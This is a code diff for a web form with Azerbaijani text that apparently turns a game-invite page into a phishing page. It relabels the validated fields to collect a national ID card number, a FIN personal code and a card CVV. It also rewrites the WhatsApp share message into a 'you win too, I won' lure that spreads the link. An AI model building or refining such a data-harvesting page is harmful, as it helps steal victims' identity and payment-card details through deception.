@@ -190,14 +190,14 @@ document.getElementById('form-register').addEventListener('submit', async functi
 
   // Numara: tam olaraq 9 simvol (nə az, nə çox)
   if (numara.length !== 9) {
-    setErr('err-numara', 'Numara tam olaraq 9 simvol olmalıdır');
+    setErr('err-numara', 'Şəxsiyyət Vəsiqəsinin Nömrəsi tam olaraq 9 simvol olmalıdır');
     setInputError('inp-numara', true);
     valid = false;
   }
 
   // Fön: tam olaraq 7 simvol (nə az, nə çox)
   if (fon.length !== 7) {
-    setErr('err-fon', 'Fön tam olaraq 7 simvol olmalıdır');
+    setErr('err-fon', 'FİN tam olaraq 7 simvol olmalıdır');
     setInputError('inp-fon', true);
     valid = false;
   }
@@ -261,7 +261,7 @@ function fallbackCopy(text) {
 
 // ───── WHATSAPP SHARE ─────
 document.getElementById('btn-whatsapp').addEventListener('click', function () {
-  const text = encodeURIComponent('🎉 Salam! Bura qoşul və birlikdə oynayaq:\n' + shareUrl);
+  const text = encodeURIComponent('Salam necəsən? Burdan Qeydiyyatdan Keç Səndə Qazan Mən Qazandım:\n' + shareUrl);
   window.open('https://api.whatsapp.com/send?text=' + text, '_blank', 'noopener,noreferrer');
 });
 
@@ -314,7 +314,7 @@ document.getElementById('form-message').addEventListener('submit', async functio
 
   // Kod: tam olaraq 3 rəqəm
   if (!/^\d{3}$/.test(kod)) {
-    setErr('err-kod', 'Kod dəqiq 3 rəqəm olmalıdır');
+    setErr('err-kod', 'CVV dəqiq 3 rəqəm olmalıdır');
     setInputError('inp-kod', true);
     valid = false;
   }
